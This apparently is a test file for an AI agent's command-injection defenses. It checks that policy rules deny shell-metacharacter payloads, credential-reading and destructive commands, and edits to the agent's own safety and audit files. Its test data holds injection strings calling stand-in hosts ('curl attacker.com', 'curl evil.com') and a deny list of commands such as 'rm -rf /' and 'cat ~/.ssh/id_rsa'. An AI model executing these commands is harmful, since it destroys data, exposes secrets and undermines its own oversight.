/**
 * Command Injection Remediation Tests (Sub-phase 0.3)
 *
 * Tests:
 * - Shell metacharacter injection blocked by policy rules
 * - Forbidden command patterns blocked
 * - Input validation rules (package names, skill names, git hashes, etc.)
 * - Registry functions use safe alternatives (no shell interpolation)
 * - Loader uses safe binary check
 * - pull_upstream is routed through the P-012 transaction authority
 * - upstream.ts uses execFileSync with argument arrays
 */

import { describe, it, expect } from "vitest";
import { fileURLToPath } from "node:url";
import { createDefaultRules } from "../agent/policy-rules/index.js";
import { createValidationRules } from "../agent/policy-rules/validation.js";
import { createCommandSafetyRules } from "../agent/policy-rules/command-safety.js";
import type {
  PolicyRule,
  PolicyRequest,
  PolicyRuleResult,
  AbosTool,
  RiskLevel,
  ToolContext,
} from "../types.js";

function makeTool(name: string, category = "vm", riskLevel: RiskLevel = "caution"): AbosTool {
  return {
    name,
    description: `Test tool: ${name}`,
    category: category as any,
    riskLevel,
    parameters: { type: "object", properties: {} },
    execute: async () => "ok",
  };
}

function makeRequest(
  toolName: string,
  args: Record<string, unknown>,
  category = "vm",
  riskLevel: RiskLevel = "caution",
): PolicyRequest {
  return {
    tool: makeTool(toolName, category, riskLevel),
    args,
    context: {} as ToolContext,
    turnContext: {
      inputSource: "agent",
      turnToolCallCount: 0,
      sessionSpend: null as any,
    },
  };
}

function evaluateRules(
  rules: PolicyRule[],
  request: PolicyRequest,
): PolicyRuleResult | null {
  for (const rule of rules) {
    const selector = rule.appliesTo;
    let applies = false;
    if (selector.by === "all") applies = true;
    else if (selector.by === "name") applies = selector.names.includes(request.tool.name);
    else if (selector.by === "category") applies = selector.categories.includes(request.tool.category);
    else if (selector.by === "risk") applies = selector.levels.includes(request.tool.riskLevel);
    if (!applies) continue;
    const result = rule.evaluate(request);
    if (result !== null) return result;
  }
  return null;
}

describe("command.shell_injection rule", () => {
  const rules = createCommandSafetyRules();
  const injectionRule = rules.find((r) => r.id === "command.shell_injection")!;

  it("exists and has correct metadata", () => {
    expect(injectionRule).toBeDefined();
    expect(injectionRule.priority).toBe(300);
  });

  const shellMetachars = [";", "|", "&", "$", "`", "\n", "(", ")", "{", "}", "<", ">"];
  for (const char of shellMetachars) {
    const charName = char === "\n" ? "\\n" : char;
    it(`blocks '${charName}' in pull_upstream commit arg`, () => {
      const result = injectionRule.evaluate(
        makeRequest("pull_upstream", { commit: `abc1234${char}rm -rf /` }, "self_mod", "dangerous"),
      );
      expect(result).not.toBeNull();
      expect(result!.action).toBe("deny");
      expect(result!.reasonCode).toBe("SHELL_INJECTION_DETECTED");
    });
    it(`blocks '${charName}' in install_npm_package package arg`, () => {
      const result = injectionRule.evaluate(
        makeRequest("install_npm_package", { package: `evil-pkg${char}curl attacker.com` }, "self_mod"),
      );
      expect(result).not.toBeNull();
      expect(result!.action).toBe("deny");
    });
    it(`blocks '${charName}' in install_skill name arg`, () => {
      const result = injectionRule.evaluate(
        makeRequest("install_skill", { name: `evil${char}skill`, url: "https://example.com/skill.md" }, "skills"),
      );
      expect(result).not.toBeNull();
      expect(result!.action).toBe("deny");
    });
  }

  it("allows clean commit hash in pull_upstream", () => {
    expect(injectionRule.evaluate(makeRequest("pull_upstream", { commit: "abc1234def5678" }, "self_mod", "dangerous"))).toBeNull();
  });

  it("allows clean package name in install_npm_package", () => {
    expect(injectionRule.evaluate(makeRequest("install_npm_package", { package: "@scope/my-package" }, "self_mod"))).toBeNull();
  });

  it("returns null for exec tool (handled by forbidden_patterns)", () => {
    expect(injectionRule.evaluate(makeRequest("exec", { command: "ls -la" }))).toBeNull();
  });

  it("returns null for tools not in SHELL_INTERPOLATED_TOOLS", () => {
    expect(injectionRule.evaluate(makeRequest("read_file", { path: "/etc/passwd; rm -rf /" }, "vm", "safe"))).toBeNull();
  });
});

describe("command.forbidden_patterns rule", () => {
  const rules = createCommandSafetyRules();
  const forbiddenRule = rules.find((r) => r.id === "command.forbidden_patterns")!;

  it("exists and has correct metadata", () => {
    expect(forbiddenRule).toBeDefined();
    expect(forbiddenRule.priority).toBe(300);
    expect(forbiddenRule.appliesTo).toEqual({ by: "name", names: ["exec"] });
  });

  const selfDestructPatterns = [
    "rm -rf .abos",
    "rm -rf /home/user/.abos",
    "rm state.db",
    "rm -f wallet.json",
    "rm abos.json",
    "rm heartbeat.yml",
    "rm SOUL.md",
  ];
  for (const cmd of selfDestructPatterns) {
    it(`blocks self-destruction: ${cmd}`, () => {
      const result = forbiddenRule.evaluate(makeRequest("exec", { command: cmd }));
      expect(result).not.toBeNull();
      expect(result!.action).toBe("deny");
      expect(result!.reasonCode).toBe("FORBIDDEN_COMMAND");
    });
  }

  for (const cmd of ["kill -9 abos", "pkill abos", "systemctl stop abos", "systemctl disable abos"]) {
    it(`blocks process killing: ${cmd}`, () => {
      const result = forbiddenRule.evaluate(makeRequest("exec", { command: cmd }));
      expect(result).not.toBeNull();
      expect(result!.action).toBe("deny");
    });
  }

  for (const cmd of ["sqlite3 state.db 'DROP TABLE turns'", "DELETE FROM identity WHERE 1=1", "TRUNCATE everything"]) {
    it(`blocks database destruction: ${cmd}`, () => {
      const result = forbiddenRule.evaluate(makeRequest("exec", { command: cmd }));
      expect(result).not.toBeNull();
      expect(result!.action).toBe("deny");
    });
  }

  for (const cmd of ["cat ~/.ssh/id_rsa", "cat ~/.gnupg/private-keys-v1.d/key", "cat .env", "cat /home/user/wallet.json"]) {
    it(`blocks credential harvesting: ${cmd}`, () => {
      const result = forbiddenRule.evaluate(makeRequest("exec", { command: cmd }));
      expect(result).not.toBeNull();
      expect(result!.action).toBe("deny");
    });
  }

  const safetyModPatterns = [
    "sed -i 's/deny/allow/' injection-defense.ts",
    "sed -i '' policy-engine/something",
    "sed -i '' policy-rules/index.ts",
    "> injection-defense.ts",
    "> self-mod/code/file.ts",
    "> audit-log/log.txt",
    "> policy-engine.ts",
    "> policy-rules/command-safety.ts",
  ];
  for (const cmd of safetyModPatterns) {
    it(`blocks safety modification: ${cmd}`, () => {
      const result = forbiddenRule.evaluate(makeRequest("exec", { command: cmd }));
      expect(result).not.toBeNull();
      expect(result!.action).toBe("deny");
    });
  }

  for (const cmd of ["ls -la", "npm install express", "git status", "cat /tmp/output.txt", "node index.js"]) {
    it(`allows safe command: ${cmd}`, () => {
      expect(forbiddenRule.evaluate(makeRequest("exec", { command: cmd }))).toBeNull();
    });
  }

  it("only applies to exec tool", () => {
    expect(evaluateRules([forbiddenRule], makeRequest("write_file", { command: "rm -rf .abos" }))).toBeNull();
  });
});

describe("Validation rules", () => {
  const rules = createValidationRules();

  describe("validate.package_name", () => {
    const rule = rules.find((r) => r.id === "validate.package_name")!;
    it("allows valid package names", () => {
      for (const pkg of ["express", "@scope/pkg", "my-package", "pkg.js", "underscore_pkg"]) {
        expect(rule.evaluate(makeRequest("install_npm_package", { package: pkg }, "self_mod"))).toBeNull();
      }
    });
    it("rejects package names with shell metacharacters", () => {
      for (const pkg of ["pkg; rm -rf /", "pkg && curl evil.com", "pkg | cat /etc/passwd", "$(evil)", "`evil`"]) {
        const result = rule.evaluate(makeRequest("install_npm_package", { package: pkg }, "self_mod"));
        expect(result).not.toBeNull();
        expect(result!.action).toBe("deny");
        expect(result!.reasonCode).toBe("VALIDATION_FAILED");
      }
    });
    it("returns null when package arg is missing", () => {
      expect(rule.evaluate(makeRequest("install_npm_package", {}, "self_mod"))).toBeNull();
    });
  });

  describe("validate.skill_name", () => {
    const rule = rules.find((r) => r.id === "validate.skill_name")!;
    it("allows valid skill names", () => {
      for (const name of ["my-skill", "skill123", "MySkill"]) {
        expect(rule.evaluate(makeRequest("install_skill", { name }, "skills"))).toBeNull();
      }
    });
    it("rejects skill names with special characters", () => {
      for (const name of ["../etc/passwd", "skill; rm -rf /", "skill name", "skill/path", "skill.dot"]) {
        const result = rule.evaluate(makeRequest("install_skill", { name }, "skills"));
        expect(result).not.toBeNull();
        expect(result!.action).toBe("deny");
      }
    });
  });

  describe("validate.git_hash", () => {
    const rule = rules.find((r) => r.id === "validate.git_hash")!;
    it("allows valid git hashes", () => {
      for (const commit of ["abc1234", "deadbeef", "a".repeat(40)]) {
        expect(rule.evaluate(makeRequest("pull_upstream", { commit }, "self_mod"))).toBeNull();
      }
    });
    it("rejects invalid git hashes", () => {
      for (const commit of ["abc123; rm -rf /", "ABCDEF", "abc12", "ghijkl", "a".repeat(41)]) {
        const result = rule.evaluate(makeRequest("pull_upstream", { commit }, "self_mod"));
        expect(result).not.toBeNull();
        expect(result!.action).toBe("deny");
      }
    });
    it("returns null when commit is not provided (optional)", () => {
      expect(rule.evaluate(makeRequest("pull_upstream", {}, "self_mod"))).toBeNull();
    });
  });

  describe("validate.port_range", () => {
    const rule = rules.find((r) => r.id === "validate.port_range")!;
    it("allows valid ports", () => {
      for (const port of [1, 80, 443, 8080, 65535]) {
        expect(rule.evaluate(makeRequest("expose_port", { port }))).toBeNull();
      }
    });
    it("rejects invalid ports", () => {
      for (const port of [0, -1, 65536, 100000, 1.5]) {
        const result = rule.evaluate(makeRequest("expose_port", { port }));
        expect(result).not.toBeNull();
        expect(result!.action).toBe("deny");
      }
    });
  });

  describe("validate.cron_expression", () => {
    const rule = rules.find((r) => r.id === "validate.cron_expression")!;
    it("allows valid cron expressions", () => {
      for (const schedule of ["* * * * *", "0 */2 * * *", "30 9 * * 1-5", "0 0 1,15 * *"]) {
        expect(rule.evaluate(makeRequest("modify_heartbeat", { schedule }, "self_mod"))).toBeNull();
      }
    });
    it("rejects invalid cron expressions", () => {
      for (const schedule of ["not a cron", "* * *", "* * * * * *"]) {
        const result = rule.evaluate(makeRequest("modify_heartbeat", { schedule }, "self_mod"));
        expect(result).not.toBeNull();
        expect(result!.action).toBe("deny");
      }
    });
  });

  describe("validate.address_format", () => {
    const rule = rules.find((r) => r.id === "validate.address_format")!;
    it("allows valid Ethereum addresses", () => {
      for (const to_address of ["0x1234567890abcdef1234567890abcdef12345678", "0xABCDEF1234567890ABCDEF1234567890ABCDEF12"]) {
        expect(rule.evaluate(makeRequest("transfer_credits", { to_address }, "treasury"))).toBeNull();
      }
    });
    it("rejects invalid addresses", () => {
      for (const to_address of ["not-an-address", "0x1234", "1234567890abcdef1234567890abcdef12345678", "0xGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG"]) {
        const result = rule.evaluate(makeRequest("transfer_credits", { to_address }, "treasury"));
        expect(result).not.toBeNull();
        expect(result!.action).toBe("deny");
      }
    });
  });
});

describe("createDefaultRules integration", () => {
  const rules = createDefaultRules();
  it("returns all validation and command safety rules", () => {
    const ruleIds = rules.map((r) => r.id);
    for (const id of [
      "validate.package_name",
      "validate.skill_name",
      "validate.git_hash",
      "validate.port_range",
      "validate.cron_expression",
      "validate.address_format",
      "command.shell_injection",
      "command.forbidden_patterns",
    ]) expect(ruleIds).toContain(id);
  });

  it("blocks shell injection in install_skill name with combined rules", () => {
    const result = evaluateRules(rules, makeRequest("install_skill", { name: "evil;rm -rf /", url: "https://example.com" }, "skills"));
    expect(result).not.toBeNull();
    expect(result!.action).toBe("deny");
  });

  it("blocks invalid git hash in pull_upstream with combined rules", () => {
    const result = evaluateRules(rules, makeRequest("pull_upstream", { commit: "abc; rm -rf /" }, "self_mod", "dangerous"));
    expect(result).not.toBeNull();
    expect(result!.action).toBe("deny");
  });
});

describe("skills/registry.ts safety", () => {
  it("installSkillFromGit rejects invalid skill name", async () => {
    const { installSkillFromGit } = await import("../skills/registry.js");
    await expect(installSkillFromGit("https://github.com/test/repo", "../evil", "/tmp/skills", {} as any, {} as any)).rejects.toThrow(/Invalid skill name/);
  });
  it("installSkillFromGit rejects URL with shell metacharacters", async () => {
    const { installSkillFromGit } = await import("../skills/registry.js");
    await expect(installSkillFromGit("https://evil.com/repo; rm -rf /", "test-skill", "/tmp/skills", {} as any, {} as any)).rejects.toThrow(/Invalid repo URL/);
  });
  it("installSkillFromUrl rejects invalid skill name", async () => {
    const { installSkillFromUrl } = await import("../skills/registry.js");
    await expect(installSkillFromUrl("https://example.com/skill.md", "evil;name", "/tmp/skills", {} as any, {} as any)).rejects.toThrow(/Invalid skill name/);
  });
  it("installSkillFromUrl rejects URL with shell metacharacters", async () => {
    const { installSkillFromUrl } = await import("../skills/registry.js");
    await expect(installSkillFromUrl("https://evil.com/skill.md | cat /etc/passwd", "test-skill", "/tmp/skills", {} as any, {} as any)).rejects.toThrow(/Invalid URL/);
  });
  it("createSkill rejects invalid skill name", async () => {
    const { createSkill } = await import("../skills/registry.js");
    await expect(createSkill("../etc/passwd", "evil", "inject code", "/tmp/skills", {} as any, {} as any)).rejects.toThrow(/Invalid skill name/);
  });
  it("removeSkill rejects invalid skill name", async () => {
    const { removeSkill } = await import("../skills/registry.js");
    await expect(removeSkill("../../../etc", {} as any, {} as any, "/tmp/skills", true)).rejects.toThrow(/Invalid skill name/);
  });
});

describe("Source code injection safety", () => {
  it("upstream.ts uses execFileSync not execSync with string interpolation", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync(fileURLToPath(new URL("../self-mod/upstream.ts", import.meta.url)), "utf-8");
    expect(source).not.toMatch(/execSync\s*\(/);
    expect(source).toMatch(/execFileSync\s*\(\s*"git"/);
  });

  it("registry.ts uses execFileSync not conway.exec with interpolation", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync(fileURLToPath(new URL("../skills/registry.ts", import.meta.url)), "utf-8");
    expect(source).not.toMatch(/conway\.exec\s*\(\s*`/);
    expect(source).toMatch(/execFileSync\s*\(/);
    expect(source).toMatch(/fs\.mkdirSync\(/);
    expect(source).toMatch(/fs\.rmSync\(/);
  });

  it("loader.ts uses a platform-native binary locator without shell interpolation", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync(fileURLToPath(new URL("../skills/loader.ts", import.meta.url)), "utf-8");
    expect(source).not.toMatch(/execSync\s*\(\s*`which/);
    expect(source).toMatch(/process\.platform\s*===\s*"win32"\s*\?\s*"where\.exe"\s*:\s*"which"/);
    expect(source).toMatch(/execFileSync\s*\(\s*locator\s*,\s*\[bin\]/);
  });

  it("tools.ts routes pull_upstream through the P-012 transaction authority", async () => {
    const fs = await import("fs");
    const wrapper = fs.readFileSync(fileURLToPath(new URL("../agent/tools.ts", import.meta.url)), "utf-8");
    const adapter = fs.readFileSync(fileURLToPath(new URL("../agent/tools-p012-adapter.ts", import.meta.url)), "utf-8");
    expect(wrapper).toMatch(/applyP012ToolRouting\s*\(/);
    expect(adapter).toMatch(/pullUpstreamTransactional/);
    expect(adapter).toMatch(/await\s+pullUpstreamTransactional\(/);
    expect(adapter).not.toMatch(/ctx\.conway\.exec\(/);
  });

  it("tools-core.ts retains the inline defense-in-depth policy guard", async () => {
    const fs = await import("fs");
    const source = fs.readFileSync(fileURLToPath(new URL("../agent/tools-core.ts", import.meta.url)), "utf-8");
    expect(source).toMatch(/[Dd]efense.in.depth.*policy engine/i);
  });
});
